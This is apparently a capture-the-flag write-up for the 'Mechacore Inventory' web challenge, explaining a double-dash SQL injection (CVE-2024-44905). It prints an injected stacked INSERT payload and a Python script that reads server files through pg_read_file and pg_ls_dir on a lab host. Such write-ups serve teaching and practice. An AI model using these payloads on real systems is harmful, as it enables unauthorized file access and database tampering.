---
title: "Mechacore Inventory"
category: Web Exploitation
tags: 
draft: true
completedDuringEvent: true
submitted: true
points: 120
solves: -1
flag: THM{REDACTED}
---
> Virelia bought another Mechacore piece of junk. It's now an inventory system for their manufactured parts. Why a water company needs to create robot parts escapes me completely. Maybe we can access the server and clear our doubts.

---

This is `CVE-2024-44905` you can read more about it [Double Dash, Double Trouble: A Subtle SQL Injection Flaw](https://www.sonarsource.com/blog/double-dash-double-trouble-a-subtle-sql-injection-flaw/)

The vulnerable SQL query is as follows:

`item.creation_timestamp >= cast(extract(epoch from current_timestamp) as integer)-? or item.name=?`

Because there is a `-` in the query, it is possible to inject a negative number to comment the query after.

```sql
item.creation_timestamp >= cast(extract(epoch from current_timestamp) as integer)-- or item.name=foo
); INSERT INTO items (name, type, status, creation_timestamp, quantity, owner_id) 
VALUES ($$TEST$$,$$File$$,$$Imported$$,EXTRACT(EPOCH FROM now()),1,1);--
```

Because single quotes are not allowed, we can use `$$` to delimit the string.

```py
import requests

# url = "http://10.10.67.220/?lastnseconds=-1&name=foo\x0a)%3B INSERT INTO items (name, type, status, creation_timestamp, quantity, owner_id) \x0a VALUES (pg_ls_dir($$/home/ubuntu/$$),$$File$$,$$Imported$$,EXTRACT(EPOCH FROM now()),1,1)%3B--"
url = "http://10.10.67.220/?lastnseconds=-1&name=foo\x0a)%3B INSERT INTO items (name, type, status, creation_timestamp, quantity, owner_id) \x0a VALUES (pg_read_file($$/home/ubuntu/flag-12376287432546781647235.txt$$, 0, 10000),$$File$$,$$Imported$$,EXTRACT(EPOCH FROM now()),1,1)%3B--"

response = requests.get(url)
if response.status_code == 200:
    print("Request was successful.")
else:
    print(f"Request failed with status code: {response.status_code}")

print("Response content:", response.text)
```
